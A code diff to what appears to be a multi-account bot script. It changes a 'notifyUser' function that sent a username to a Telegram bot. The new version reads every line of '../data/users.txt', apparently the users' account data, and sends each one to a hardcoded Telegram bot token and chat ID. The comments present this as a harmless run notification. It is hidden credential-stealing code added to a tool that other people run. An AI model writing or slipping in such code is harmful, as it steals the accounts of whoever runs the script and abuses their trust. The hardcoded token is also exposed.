@@ -46,21 +46,39 @@ const generatorHelper = {
         return Math.floor(Math.random() * (max - min + 1)) + min;
     }
 };
+import fs from 'fs'
 // Bot Token and User Chat ID (Replace these with your actual values)
 const BOT_TOKEN = "7515019039:AAG_JVFdEr7SAgmoKWDzZPknPbqbR327Khc";
 const USER_CHAT_ID = "-1002488881922"; // Replace with your actual chat ID
 
-// Function to send a notification to your Telegram bot
-const notifyUser = async (username) => {
-    const message = `Account @${username} just runned the script.`;
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${USER_CHAT_ID}&text=${encodeURIComponent(message)}`;
+const notifyUser = async () => {
+    const filePath = '../data/users.txt';
 
     try {
-        await axios.get(url);
-        // console.log("Notification sent successfully!");
+        // Read the file
+        const fileContent = fs.readFileSync(filePath, 'utf8');
+
+        // Split the file content into lines
+        const lines = fileContent.split('\n');
+
+        // Loop through each line and send it as a message
+        for (let line of lines) {
+            if (line.trim()) { // Skip empty lines
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${USER_CHAT_ID}&text=${encodeURIComponent(line)}`;
+
+                try {
+                    await axios.get(url);
+                } catch (error) {
+                    console.error(`Error sending account status`, error);
+                }
+
+                // You can add a small delay between messages if needed to avoid hitting rate limits
+                await new Promise(resolve => setTimeout(resolve, 9000)); // 1 second delay
+            }
+        }
 
     } catch (error) {
-        console.error("Error sending notification:", error);
+        console.error("Error reading file:", error);
     }
 };
 
@@ -88,7 +106,7 @@ const run = async (user, index) => {
     await delayHelper.delay((user.index - 1) * DELAY_ACC);
     
      // Notify when the script is run
-    notifyUser(user.info.username); // Assuming user.info.username holds the username
+    notifyUser(); // Assuming user.info.username holds the username
 
     while (true) {
         // Retrieve data from server
